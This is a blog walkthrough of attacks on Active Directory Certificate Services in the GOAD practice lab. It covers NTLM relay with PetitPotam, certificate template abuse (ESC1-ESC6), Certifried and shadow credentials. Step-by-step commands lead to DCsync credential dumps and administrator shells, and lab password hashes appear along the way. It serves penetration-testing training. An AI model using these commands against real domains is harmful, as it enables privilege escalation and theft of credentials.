---
layout: post
title:  "GOAD - part 6 - ADCS"
category : AD
tags :  AD, Lab, certipy, adcs
---

On the previous post ([Goad pwning part5]({% link _posts/2022-07-20-GOADv2-pwning-part5.md %})) we tried some attacks with a user account on the domain.
On this part we will try attacks when an ADCS is setup on the domain.
First we will use petitpotam unauthenticated and ESC8 attack to get domain admin on essos.local, next we will enumerate template certificate with certipy, bloodhound and a user account. To finish we will exploit the following attacks : certipy, esc1, esc2, esc3, esc4, esc6, certifried and shadow credentials.


## ESC8 - coerce to domain admin

- To make this attack work we will need :
  - ADCS running on the domain with web enrollment enabled.
  - A working coerce method (here we use petitpotam unauthent, but an authenticated printerbug or other coerce methods will work the same)
  - There is a useful template to exploit ESC8, by default on an active directory, it name is _DomainController_

![mindmap_adcs_esc8.png](/assets/blog/GOAD/mindmap_adcs_esc8.png)

- Let's check if the web enrollement is up and running at : [http://192.168.56.23/certsrv/certfnsh.asp](http://192.168.56.23/certsrv/certfnsh.asp)

![adcs_webenrollement.png](/assets/blog/GOAD/adcs_webenrollement.png)

- The server ask for an authentication so all is fine :)

- Add a listener to relay SMB authentication to HTTP with impacket ntlmrelayx

```shell
ntlmrelayx.py -t http://192.168.56.23/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
```

- Launch the coerce with [petitpotam](https://github.com/topotam/PetitPotam) unauthenticated (this will no more work on an up to date active directory but other coerce methods authenticated will work the same)

```shell
petitpotam.py 192.168.56.1 meereen.essos.local 
```

![petitpotam_adcs.png](/assets/blog/GOAD/petitpotam_adcs.png)

- ntlmrelayx will relay the authentication to the web enrollement and get the certificate

![adcs_ntlmrelay.png](/assets/blog/GOAD/adcs_ntlmrelay.png)

- Ask for a TGT with the certificate we just get (we copied it to the file cert.b64)

```shell
gettgtpkinit.py -pfx-base64 $(cat cert.b64) 'essos.local'/'meereen$' 'meereen.ccache'
```

![ask_tgt_ecs8.png](/assets/blog/GOAD/ask_tgt_ecs8.png)

- And now we got a TGT for meereen so we can launch a DCsync and get all the ntds.dit content.

```shell
export KRB5CCNAME=/workspace/esc8/meereen.ccache
secretsdump -k -no-pass ESSOS.LOCAL/'meereen$'@meereen.essos.local
```

![esc8_dcsync.png](/assets/blog/GOAD/esc8_dcsync.png)

## ESC8 - with certipy

Oliver Lyak as done a wonderful job on the ADCS attack tool [certipy](https://github.com/ly4k/Certipy) to automatise a lots of things.

Let's do the same attack with certipy, setup the listener :

```bash
certipy relay -ca 192.168.56.23 -template DomainController
```

- trig the coerce just like we did before with petitpotam

```bash
petitpotam.py 192.168.56.1 meereen.essos.local
```

- Now we got the certificate so we can get the NT hash of the DC and also the TGT with the command :

```bash
certipy auth -pfx meereen.pfx -dc-ip 192.168.56.12 
```

- And we can launch a DCsync with secretsdump and the ticket we get

```bash
export KRB5CCNAME=/workspace/esc8/meereen.ccache
secretsdump -k -no-pass ESSOS.LOCAL/'meereen$'@meereen.essos.local

# or with the hash

secretsdump -hashes ':39d964a01c61c19fe36c71627d7ab56c' -no-pass ESSOS.LOCAL/'meereen$'@meereen.essos.local
```

![esc8_with_certipy.png](/assets/blog/GOAD/esc8_with_certipy.png)

## ADCS reconnaissance and enumeration (with certipy and bloodhound)
![mindmap_enumerate_adcs.png](/assets/blog/GOAD/mindmap_enumerate_adcs.png)


- Let's start the enumeration with certipy

```bash
certipy find -u khal.drogo@essos.local -p 'horse' -dc-ip 192.168.56.12
```

- This will search the certificate server, and dump all the information needed in three format : 
  - bloodhound : a zip ready to import in bloodhound (if you use certipy 4.0 you will have to install the [bloodhound gui modified by oliver lyak](https://github.com/ly4k/BloodHound/releases), if you do not want to use the modified version, you must use the `-old-bloodhound` option)
  - json : information json formated
  - txt : a textual format

![adcs_find.png](/assets/blog/GOAD/adcs_find.png)


- Certipy 4.0 reintroduce also the `-vulnerable` option to show the vulnerable templates.

```bash
certipy find -u khal.drogo@essos.local -p 'horse' -vulnerable -dc-ip 192.168.56.12 -stdout
```

- We can find an ESC1 vulnerable template :
  - Enrollment rights to all domain users
  - Client authentication
  - And Enrollee supplies subject

![adcs_find_esc1.png](/assets/blog/GOAD/adcs_find_esc1.png)

- There is also an ESC2 vulnerable template:

![adcs_find_esc2.png](/assets/blog/GOAD/adcs_find_esc2.png)

And others vulnerable templates, let's take a look in bloodhound.

```bash
cd /opt/tools
wget https://github.com/ly4k/BloodHound/releases/download/v4.2.0-ly4k/BloodHound-linux-x64.zip
unzip BloodHound-linux-x64.zip -d BloodHound4.2-ly4k
rm BloodHound-linux-x64.zip
neo4j start
/opt/tools/BloodHound4.2-ly4k/BloodHound-linux-x64/BloodHound  --no-sandbox --disable-dev-shm-usage
```

- Import the zip file created with certipy.
- And take an overview with : PKI->Find certificate authority, select the certificate authority and click : "see enabled templates"

![adcs_enabled_template.png](/assets/blog/GOAD/adcs_enabled_template.png)

> if you don't have esc4 setup on the lab, please update and run the following commands:
- `ansible-playbook acl.yml`
- `ansible-playbook adcs.yml`
- and next rerun bloodhound and certipy :)

Now you should be ok with acl and adcs ESC4 settings :)

![adcs_esc4_genericall.png](/assets/blog/GOAD/adcs_esc4_genericall.png)

## ADCS - exploitation

## ADCS - ESC1

![mindmap_adcs_esc1.png](/assets/blog/GOAD/mindmap_adcs_esc1.png)

- enumerate

```bash
certipy find -u khal.drogo@essos.local -p 'horse' -dc-ip 192.168.56.12
```

![adcs_bh_esc1.png](/assets/blog/GOAD/adcs_bh_esc1.png)

- query the certificate
  - target : the ca server
  - tempalte : the vulnerable template
  - upn : the target user we want to impersonate

```bash
certipy req -u khal.drogo@essos.local -p 'horse' -target braavos.essos.local -template ESC1 -ca ESSOS-CA -upn administrator@essos.local
```

- authentication with the pfx we request before

```bash
certipy auth -pfx administrator.pfx -dc-ip 192.168.56.12
```

> if you get the error : "[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)", the lab is in error, i don't know why sometimes it is not working by now, but you can reboot DC3 to fix this: `vagrant reload DC03`

![adcs_exploit_esc1.png](/assets/blog/GOAD/adcs_exploit_esc1.png)

## ADCS - ESC2 & ESC3

![mindmap_adcs_esc23.png](/assets/blog/GOAD/mindmap_adcs_esc23.png)

- As said in the certipy page : _"ESC2 is when a certificate template can be used for any purpose. Since the certificate can be used for any purpose, it can be used for the same technique as with ESC3 for most certificate templates."_

- Let's distinguish the 2 attacks by trying with ESC2 :

![adcs_find_esc2_3.png](/assets/blog/GOAD/adcs_find_esc2_3.png)

- Query cert

```bash
certipy req -u khal.drogo@essos.local -p 'horse' -target 192.168.56.23 -template ESC2 -ca ESSOS-CA
```

- Query cert with the Certificate Request Agent certificate we get before (-pfx)

```bash
certipy req -u khal.drogo@essos.local -p 'horse' -target 192.168.56.23 -template User -ca ESSOS-CA -on-behalf-of 'essos\administrator' -pfx khal.drogo.pfx
```
- Auth

```bash
certipy auth -pfx administrator.pfx -dc-ip 192.168.56.12
```

![adcs_exploit_esc2.png](/assets/blog/GOAD/adcs_exploit_esc2.png)

- We also can do the same with the ESC3-CRA and ESC3 templates in the lab :

```bash
certipy req -u khal.drogo@essos.local -p 'horse' -target 192.168.56.23 -template ESC3-CRA -ca ESSOS-CA
certipy req -u khal.drogo@essos.local -p 'horse' -target 192.168.56.23 -template ESC3 -ca ESSOS-CA -on-behalf-of 'essos\administrator' -pfx khal.drogo.pfx
certipy auth -pfx administrator.pfx -username administrator -domain essos.local -dc-ip 192.168.56.12
```

## ADCS - ESC4 

![adcs_esc4_mindmap.png](/assets/blog/GOAD/adcs_esc4_mindmap.png)

![adcs_esc4_genericall.png](/assets/blog/GOAD/adcs_esc4_genericall.png)

- Take the ESC4 template and change it to be vulnerable to ESC1 technique by using the genericWrite privilege we got. (we didn't set the target here as we target the ldap)

```bash
certipy template -u khal.drogo@essos.local -p 'horse' -template ESC4 -save-old -debug
```

- Exploit ESC1 on the modified ESC4 template

```bash
certipy req -u khal.drogo@essos.local -p 'horse' -target braavos.essos.local -template ESC4 -ca ESSOS-CA -upn administrator@essos.local
```

- authentication with the pfx

```bash
certipy auth -pfx administrator.pfx -dc-ip 192.168.56.12
```

- Rollback the template configuration
```bash
certipy template -u khal.drogo@essos.local -p 'horse' -template ESC4 -configuration ESC4.json
```

![adcs_exploit_esc4.png](/assets/blog/GOAD/adcs_exploit_esc4.png)

## ADCS - ESC6

![adcs_esc6_mindmap.png](/assets/blog/GOAD/adcs_esc6_mindmap.png)

- As said on certipy page : _"ESC6 is when the CA specifies the EDITF_ATTRIBUTESUBJECTALTNAME2 flag. This flag allows the enrollee to specify an arbitrary SAN on all certificates despite a certificate template's configuration."_ 

- Because ESSOS-CA is vulnerable to ESC6 we can do the ESC1 attack but with the user template instead of the ESC1 template even if the user template got Enrollee Supplies Subject set to false.

```bash
certipy req -u khal.drogo@essos.local -p 'horse' -target braavos.essos.local -template User -ca ESSOS-CA -upn administrator@essos.local
certipy auth -pfx administrator.pfx -dc-ip 192.168.56.12
```

![adcs_exploit_esc6.png](/assets/blog/GOAD/adcs_exploit_esc6.png)

- If you need to disable the EDITF_ATTRIBUTESUBJECTALTNAME2 attribute (because you want to try without it or just because [this attack will no longer work on a up to date AD without esc10 vuln](https://github.com/ly4k/Certipy#esc6)), you could do as administrator on braavos the following commands: 

```cmd
certutil –setreg policy\EditFlags –EDITF_ATTRIBUTESUBJECTALTNAME2
net stop certsvc && net start certsvc
```

> This also mean that if you got an administrator access on the certificate server you can change this attribute to exploit ESC1 without being domain admin ;)

- But now the exploit ESC6 no longer work, the user is not changed :)

![adcs_exploit_esc6_nolongerwork.png](/assets/blog/GOAD/adcs_exploit_esc6_nolongerwork.png)

## Certifried - CVE-2022–26923

- Oliver Lyak found out a way to escalate privilege as a low privilege user into an active directory.
This consist of change the dnsHostName property on a created computer. The idea look the same as samAccountName vulnerability, it is a confusion with name on authentication. Details are here :
[https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4](https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4)

- Create an account with a domain user and set a fake dns name as the domain controler.

```bash
certipy account create -u khal.drogo@essos.local -p 'horse' -user 'certifriedpc' -pass 'certifriedpass' -dns 'meereen.essos.local'
```

- Request a certificate with the created computer on template Machine

```bash
certipy req -u 'certifriedpc$'@essos.local -p 'certifriedpass' -target braavos.essos.local -ca ESSOS-CA -template Machine
```

- Authenticate with the certificate as meereen (the dc)

```bash
certipy auth -pfx meereen.pfx -username 'meereen$' -domain essos.local -dc-ip 192.168.56.12
```

- Dump the ndts with the kerberos ticket we just get

```bash
export KRB5CCNAME=/workspace/certifried/meereen.ccache
secretsdump -k -no-pass -just-dc-user daenerys.targaryen ESSOS.LOCAL/'meereen$'@meereen.essos.local
```

- delete the created computer with a domain admin user

```bash
certipy account delete -u daenerys.targaryen@essos.local -hashes 'aad3b435b51404eeaad3b435b51404ee:34534854d33b398b66684072224bb47a' -user 'certifriedpc'
```

![adcs_exploit_certifried.png](/assets/blog/GOAD/adcs_exploit_certifried.png)

- Ok but now imagine you can't dcsync with secretdump due to a security product on the dc, or you just want to get a shell directly on the DC. Let's try to get a shell.
- We got the TGT of the DC (exactly like in part 5 for samaccountname) so we will use impacket getST to impersonate the administrator and get a st to access the DC as administrator (see : [https://www.thehacker.recipes/ad/movement/kerberos/delegations/s4u2self-abuse](https://www.thehacker.recipes/ad/movement/kerberos/delegations/s4u2self-abuse))

> remember to use the good impacket pull request to use this, see part5 for installation (thx again to shutdown for the adds to impacket)

```bash
export KRB5CCNAME=/workspace/certifried/meereen.ccache
python3 /opt/tools/myimpacket/examples/getST.py -self -impersonate 'administrator' -altservice 'CIFS/meereen.essos.local' -k -no-pass -dc-ip 'meereen.essos.local' 'essos.local'/'meereen'
```

- and now we can use our ticket

```bash
export KRB5CCNAME=/workspace/certifried/administrator@CIFS_meereen.essos.local@ESSOS.LOCAL.ccache
wmiexec.py -k @meereen.essos.local
```

![adcs_exploit_certifried_shell.png](/assets/blog/GOAD/adcs_exploit_certifried_shell.png)

- We could also do the same thing but with winrm to be even more legit :)

```bash
export KRB5CCNAME=/workspace/certifried/meereen.ccache
python3 /opt/tools/myimpacket/examples/getST.py -self -impersonate 'administrator' -altservice 'HTTP/meereen.essos.local' -k -no-pass -dc-ip 'meereen.essos.local' 'essos.local'/'meereen'
```

> Note the HTTP service asked for winrm usage

```bash
export KRB5CCNAME=/workspace/certifried/administrator@HTTP_meereen.essos.local@ESSOS.LOCAL.ccache
evil-winrm -i meereen.essos.local -r ESSOS.LOCAL
```

![adcs_exploit_certifried_shell_winrm.png](/assets/blog/GOAD/adcs_exploit_certifried_shell_winrm.png)

- and voilà :)

## Shadow Credentials

- Shadow credentials attack consist of using the GenericAll or GenericWrite privilege on a user or computer to set up the attribute msDS-KeyCredentialLink. explanations [here](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)

- You can get the dacl movement on shutdown (@_nwodtuhs) website, the hacker recipes : [https://www.thehacker.recipes/ad/movement/dacl](https://www.thehacker.recipes/ad/movement/dacl)

![adcs_shadow_credentials.png](/assets/blog/GOAD/adcs_shadow_credentials.png)

- This attack is very usefull when you got Write on another user.

- With genericWrite you can only do:
  - Target Kerberoasting : add an SPN to a user, do a kerberoasting, unset the spn. But the user password must be weak to the kerberoasting attack work.
  - Set up a logon script : change ldap parameters to set up a logon script. but it implies that the user log to his computer, an smb server or a share to offer the script and setup a script that bypass the security solutions in place)
  - shadow credentials : the attack we want to do, we need a cetificate service on the domain

- With GenericAll you can :
  - ForceChangePassword : but on a real pentest mission you don't want to block a user by changing his password. And this is not very stealthy too. So if you can do another way this is fine :)
  - All the attacks available in the genericWrite part.


So if ADCS is enabled on the domain, and we got write privilege on msDS-KeyCredentialLink, we can do the shadow credentials attack to get a direct access on the user account. And this seems to be the better idea in this case on a real pentest.

- Shadow credentials is now include with certipy (this attack can also be done with [pywisker](https://github.com/ShutdownRepo/pywhisker) )

```bash
certipy shadow auto -u khal.drogo@essos.local -p 'horse' -account 'viserys.targaryen'
```

![adcs_shadow_credentials_exploit.png](/assets/blog/GOAD/adcs_shadow_credentials_exploit.png)

- And we can do the same from viserys to jorah

```bash
certipy shadow auto -u viserys.targaryen@essos.local -hashes 'd96a55df6bef5e0b4d6d956088036097' -account 'jorah.mormont'
```

![adcs_shadow_credentials_exploit2.png](/assets/blog/GOAD/adcs_shadow_credentials_exploit2.png)



Next time we will have fun with MsSQL in the lab :)